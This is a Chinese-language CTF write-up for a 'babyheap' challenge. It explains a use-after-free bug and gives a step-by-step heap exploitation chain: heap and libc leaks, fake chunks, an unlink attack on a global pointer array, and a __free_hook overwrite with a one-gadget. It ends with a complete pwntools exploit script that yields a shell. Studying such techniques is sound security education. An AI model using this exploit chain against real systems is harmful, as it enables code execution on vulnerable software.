# 漏洞成因
## 程序关键结构体
程序使用全局数组存储堆块指针，并有限制编辑次数：
```c
char *ptr[10];          // 位于bss段地址0x602060，存储申请的堆块指针
int edit_count;         // 位于0x6020B0，记录edit操作次数，最多为3次
```

## 漏洞定位
1. **UAF漏洞**：free函数释放堆块后未将对应指针置NULL，导致后续可通过show或edit操作访问已释放堆块。
```c
void free() {
    free((&ptr)[index]); // 释放后指针未被清空，造成UAF
}
```
2. **堆布局漏洞**：通过UAF泄露堆地址后，可构造fake chunk并利用unlink机制实现任意地址写。

# 漏洞利用过程：
利用UAF泄露堆地址，通过堆块错位修改chunk大小，构造unlink实现任意地址写，最终劫持`__free_hook`执行one-gadget获得shell。

- Step1~2: 泄露堆基地址
- Step3: 构造fake chunk实现堆块错位
- Step4: 修改chunk1大小，使其进入unsorted bin
- Step5~6: 构造第二个fake chunk为unlink做准备
- Step7~8: 触发unlink并泄露libc地址
- Step9~10: 向`__free_hook`写入one-gadget地址
- Step11: 触发`__free_hook`执行shellcode

## Step1~2
- 操作：`malloc(0,'aaaaaaaa\n'); malloc(1,'bbbbbbbb\n'); free(1); free(0); puts(0);`
- 内存变化：
  - 堆内存`0x138d6000`处（chunk0），初始内容为用户数据"aaaaaaaa"，free后其fd指向chunk1（地址`0x138d6030`）。变化原因：fastbin单向链表，后free的chunk0的fd指向先free的chunk1。
  - 通过show chunk0泄露chunk1地址，计算得堆基地址`heap_addr = 泄露地址 - 0x30`。

## Step3
- 操作：`edit(0, p64(heap_addr+0x20) + p64(0) + p64(0) + p64(0x31))`
- 内存变化：
  - 堆内存`0x138d6010`处（chunk0的fd位置），此前内容为chunk1地址`0x0000138d60300000`，现在变为`0x138d6020`。变化原因：编辑chunk0，构造fake chunk的fd指向自身附近（`heap_addr+0x20`），同时设置fake chunk的presize和size。

## Step4
- 操作：`malloc(6,'aaa\n'); malloc(7,p64(0) + p64(0xa1) + '\n'); malloc(2,'cccccccc\n'); malloc(3,'dddddddd\n')`
- 内存变化：
  - 堆内存chunk1的size域被修改为`0xa1`。变化原因：通过malloc新块（chunk6和chunk7）造成堆块重叠，其中chunk7的写入覆盖了chunk1的size，使其大小超过fastbin范围，便于后续进入unsorted bin。

## Step5~6
- 操作：`FD = 0x602080-24; BK = 0x602080-16; py2 = p64(0) + p64(0x31) + p64(FD) + p64(BK); malloc(4,py2); py3 = p64(0x30) + p64(0x30) + '\n'; malloc(5,py3)`
- 内存变化：
  - 堆内存chunk4处构造了第二个fake chunk，其fd和bk分别指向全局数组`ptr`附近的`0x602068`和`0x602070`。变化原因：为unlink攻击准备，使得unlink时发生指针改写，实现`ptr[4]`指向`&ptr[1] - 0x18`。

## Step7~8
- 操作：`free(1); puts(1)`
- 内存变化：
  - 堆内存chunk1被free后，与相邻的fake chunk合并，进入unsorted bin，其fd和bk指向main_arena。变化原因：chunk1大小已被改为`0xa0`，free时触发unlink，合并后加入unsorted bin。
  - 全局变量`ptr[4]`的地址`0x602080`处，内容从指向chunk4变为指向`0x602068`。变化原因：unlink操作将`ptr[4]`改写为`&ptr[1] - 0x18`。
  - 通过show chunk1泄露main_arena地址，计算libc基址。

## Step9~10
- 操作：计算`libc_base`、`free_hook`、`onegadget`；`edit(4, p64(free_hook) + '\n'); edit(1, p64(onegadget) + '\n')`
- 内存变化：
  - 编辑chunk4（现指向`0x602068`）写入`free_hook`地址，使得`ptr[1]`指向`__free_hook`。变化原因：`ptr[4]`指向`&ptr[1]`，编辑chunk4即修改`ptr[1]`的值。
  - 编辑chunk1（现指向`__free_hook`）写入one-gadget地址。变化原因：`ptr[1]`已指向`__free_hook`，编辑chunk1即向`__free_hook`写入one-gadget地址。

## Step11
- 操作：`free(2)`
- 内存变化：free任意chunk（如chunk2）触发`__free_hook`，执行one-gadget，获得shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
elf = ELF('./babyheap')
p = process('./babyheap')
libc = elf.libc

def malloc(index, content):
    p.recvuntil("Choice:")
    p.sendline('1')
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Content:")
    p.send(content)

def free(index):
    p.recvuntil("Choice:")
    p.sendline('4')
    p.recvuntil("Index:")
    p.sendline(str(index))

def show(index):
    p.recvuntil("Choice:")
    p.sendline('3')
    p.recvuntil("Index:")
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil("Choice:")
    p.sendline('2')
    p.recvuntil("Index:")
    p.sendline(str(index))
    p.recvuntil("Content:")
    p.send(content)

# Step1-2: 泄露堆地址
malloc(0, 'aaaaaaaa\n')
malloc(1, 'bbbbbbbb\n')
free(1)
free(0)
show(0)
heap_addr = u64(p.recv(4).ljust(8, b'\x00')) - 0x30
log.info("heap_addr: " + hex(heap_addr))

# Step3: 构造fake chunk
py1 = p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31)
edit(0, py1)

# Step4: 修改chunk1大小
malloc(6, 'aaa\n')
malloc(7, p64(0) + p64(0xa1) + b'\n')
malloc(2, 'cccccccc\n')
malloc(3, 'dddddddd\n')

# Step5-6: 构造第二个fake chunk用于unlink
FD = 0x602080 - 24
BK = 0x602080 - 16
py2 = p64(0) + p64(0x31) + p64(FD) + p64(BK)
malloc(4, py2)
py3 = p64(0x30) + p64(0x30) + b'\n'
malloc(5, py3)

# Step7-8: 触发unlink并泄露libc地址
free(1)
show(1)
main_arena = u64(p.recv(6).ljust(8, b'\x00')) - 88
libc_base = (main_arena & 0xfffffffff000) - 0x3c4000
one_gadget = libc_base + 0x4526a
free_hook = libc_base + libc.symbols['__free_hook']
log.info("libc_base: " + hex(libc_base))
log.info("free_hook: " + hex(free_hook))
log.info("one_gadget: " + hex(one_gadget))

# Step9-10: 向free_hook写入one_gadget
edit(4, p64(free_hook) + b'\n')
edit(1, p64(one_gadget) + b'\n')

# Step11: 触发free_hook
free(2)
p.interactive()
```
